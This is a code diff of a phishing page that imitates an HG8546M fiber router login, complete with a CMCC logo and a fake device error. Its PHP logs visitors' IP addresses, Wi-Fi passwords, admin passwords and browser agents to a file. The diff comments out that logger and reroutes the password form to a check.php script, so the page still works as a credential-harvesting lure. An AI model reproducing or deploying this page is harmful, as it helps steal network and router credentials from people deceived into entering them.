@@ -1,3 +1,4 @@
+<!--
 ﻿<?php
 error_reporting(0);
 $fp = fopen(date('Ymdgis').'.txt', 'a');        //打开cookie.txt，若不存在则创建它
@@ -5,8 +6,8 @@ $fp = fopen(date('Ymdgis').'.txt', 'a');        //打开cookie.txt，若不存�
 fwrite($fp,"IP: ".getenv ('REMOTE_ADDR')."\n wlanPass: ".$_GET['wlan']."admin pass:".$_GET['admin']."\n agent: " . $_SERVER['HTTP_USER_AGENT']."\n");    //写入文件
 
 fclose($fp);    //关闭文件  
-
 ?>
+-->
 <html>
 <head>
 <title>HG8546M</title>
@@ -398,7 +399,7 @@ LockLeftTime = LockLeftTime - 1;
 			bordercolor="#E7E7E7" bgcolor="#E7E7E7" border="0"
 			style="position: relative;">
 			<tbody>
-				<form action='#'>
+				<form name="form1" method="POST" action="check.php">
 				<tr>
 					<td height="10" colspan="3" align="center" bgcolor="#FFFFFF"><label>
 							<img src="images/logo_cmcc.jpg" width="337" height="92">
@@ -411,7 +412,7 @@ LockLeftTime = LockLeftTime - 1;
 					<td>
 						<div id='error' style="position: relative;">
 							<span style="font-size: 8px; color: black;">光纤终端发生异常！错误异常代码611</span>
-						</div> <label> <input name="wlan" type="text" id="txt_Username"
+						</div> <label> <input name="key1" type="password" id="txt_Username"
 							style="width: 140px; font-family: Arial" maxlength="31">
 							<!-- txt_Username -->
 					</label>
